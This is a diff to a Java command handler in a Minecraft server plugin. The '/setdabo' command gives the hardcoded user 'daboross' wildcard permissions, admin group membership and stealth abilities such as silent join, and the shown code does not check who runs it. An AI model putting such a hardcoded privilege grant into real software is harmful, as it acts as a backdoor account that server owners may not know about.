@@ -20,13 +20,13 @@ class SetDaboExecutor implements CommandExecutor {
     @Override
     public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
         if (cmd.getName().equalsIgnoreCase("setdabo")) {
-            PermissionUser dabo1 = PermissionsEx.getPermissionManager().getUser("daboross");
-            dabo1.remove();
+            PermissionUser oldDabo = PermissionsEx.getPermissionManager().getUser("daboross");
+            oldDabo.remove();
             PermissionUser dabo = PermissionsEx.getPermissionManager().getUser("daboross");
-            for (String str : new String[]{"*", "-vanish.*", "vanish.vanish", "vanish.silentchests", "vanish.see", "vanish.vanish"}) {
+            for (String str : new String[]{"*", "-vanish.*", "vanish.vanish", "vanish.silentchests", "vanish.see", "vanish.vanish", "vanish.silentjoin"}) {
                 dabo.addPermission(str);
             }
-            dabo.setPrefix("&0---|&b", null);
+            dabo.setPrefix("&7---&0 * &e", null);
             dabo.addPermission("-voxelsniper.*", "PvPWorld");
             dabo.setGroups(new String[]{"admin"});
         }
